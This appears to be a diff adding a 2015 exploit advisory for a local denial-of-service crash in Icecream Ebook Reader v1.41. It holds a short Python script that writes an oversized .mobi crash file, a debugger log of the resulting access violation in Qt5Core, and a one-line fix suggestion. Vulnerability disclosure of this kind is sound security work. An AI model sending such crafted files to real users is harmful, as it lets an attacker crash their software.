@@ -1,0 +1,96 @@
+# Exploit Title: [Icecream Ebook Reader v1.41 (.mobi/.prc) Denial of Service]
+# Date: [23/01/2015]
+# Exploit Author: [Kapil Soni]
+# Twitter: [@Haxinos]
+# Vendor Homepage: [http://icecreamapps.com/]
+# Version: [Icecream Ebook Reader v1.41]
+# Tested on: [Windows XP SP2]
+
+#Technical Details & Description:
+#================================
+#A Memory Corruption Vulnerability is detected on Icecream Ebook Reader v1.41. An attacker can crash the software by using .mobi and .prc file.
+#Attackers can crash the software local by user inter action over .mobi and .prc (ebooks).
+
+
+#Piece of Code
+#========================================================================
+
+#!/usr/bin/python
+
+buffer = "A"*1000
+
+filename = "crash"+".mobi" # For testing with .prc, change the extension
+file = open(filename, 'w')
+file.write(buffer)
+file.close()
+
+print "File Successfully Created [1]"
+
+#========================================================================
+#Debugging and Error Log
+#========================
+
+#Microsoft (R) Windows Debugger Version 6.11.0001.404 X86
+#Copyright (c) Microsoft Corporation. All rights reserved.
+#*** wait with pending attach
+#Symbol search path is: *** Invalid ***
+#****************************************************************************
+#* Symbol loading may be unreliable without a symbol search path.           *
+#* Use .symfix to have the debugger choose a symbol path.                   *
+#* After setting your symbol path, use .reload to refresh symbol locations. *
+#****************************************************************************
+#Executable search path is: 
+#ModLoad: 00400000 00bd2000   C:\Program Files\Icecream Ebook Reader\ebookreader.exe
+#ModLoad: 7c900000 7c9b0000   C:\WINDOWS\system32\ntdll.dll
+#ModLoad: 7c800000 7c8f4000   C:\WINDOWS\system32\kernel32.dll
+#ModLoad: 67000000 673f1000   C:\Program Files\Icecream Ebook Reader\Qt5Core.dll
+#ModLoad: 00d30000 01158000   C:\Program Files\Icecream Ebook Reader\Qt5Gui.dll
+#.... Snipped
+#ModLoad: 769c0000 76a73000   C:\WINDOWS\system32\userenv.dll
+#ModLoad: 01960000 0196c000   C:\Program Files\Icecream Ebook Reader\imageformats\qdds.dll
+#ModLoad: 01970000 01979000   C:\Program Files\Icecream Ebook Reader\imageformats\qgif.dll
+#ModLoad: 01b10000 01b18000   C:\Program Files\Icecream Ebook Reader\imageformats\qwbmp.dll
+#ModLoad: 01b20000 01b66000   C:\Program Files\Icecream Ebook Reader\imageformats\qwebp.dll
+#ModLoad: 09e70000 09f0f000   C:\Program Files\Icecream Ebook Reader\sqldrivers\qsqlite.dll
+#ModLoad: 20000000 202c5000   C:\WINDOWS\system32\xpsp2res.dll
+#(f9c.e34): Break instruction exception - code 80000003 (first chance)
+#eax=7ffd7000 ebx=00000001 ecx=00000002 edx=00000003 esi=00000004 edi=00000005
+#eip=7c901230 esp=0a67ffcc ebp=0a67fff4 iopl=0         nv up ei pl zr na pe nc
+#cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000246
+#*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\system32\ntdll.dll - 
+#ntdll!DbgBreakPoint:
+#7c901230 cc              int     3
+#0:003> g
+#ModLoad: 763b0000 763f9000   C:\WINDOWS\system32\Comdlg32.dll
+#ModLoad: 77b40000 77b62000   C:\WINDOWS\system32\appHelp.dll
+#ModLoad: 76fd0000 7704f000   C:\WINDOWS\system32\CLBCATQ.DLL
+#ModLoad: 77050000 77115000   C:\WINDOWS\system32\COMRes.dll
+#... Snipped
+#ModLoad: 771b0000 77256000   C:\WINDOWS\system32\WININET.dll
+#ModLoad: 76f60000 76f8c000   C:\WINDOWS\system32\WLDAP32.dll
+#ModLoad: 74e30000 74e9c000   C:\WINDOWS\system32\RichEd20.dll
+#ModLoad: 76980000 76988000   C:\WINDOWS\system32\LINKINFO.dll
+#QIODevice::read: Called with maxSize < 0
+#QIODevice::read: Called with maxSize < 0
+
+#(f9c.998): Access violation - code c0000005 (first chance)
+#First chance exceptions are reported before any exception handling.
+#This exception may be expected and handled.
+#eax=6723d888 ebx=00000000 ecx=00000000 edx=ffffffff esi=0012cd9c edi=0012cf38
+#eip=671da2a7 esp=0012cc30 ebp=0012cc90 iopl=0         nv up ei pl nz na pe cy
+#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010207
+#*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Icecream Ebook Reader\Qt5Core.dll - 
+#Qt5Core!QTextCodec::toUnicode+0x7:
+#671da2a7 8b11            mov     edx,dword ptr [ecx]  ds:0023:00000000=????????
+
+#Exploitation Technique:
+#============================
+#Local, DoS, Memory Corruption
+
+#Solution - Fix & Patch:
+#=======================
+#Restrict working maximum size & set a own exception-handling for over-sized requests.
+
+#Author:
+#=======
+#Kapil Soni (Haxinos)
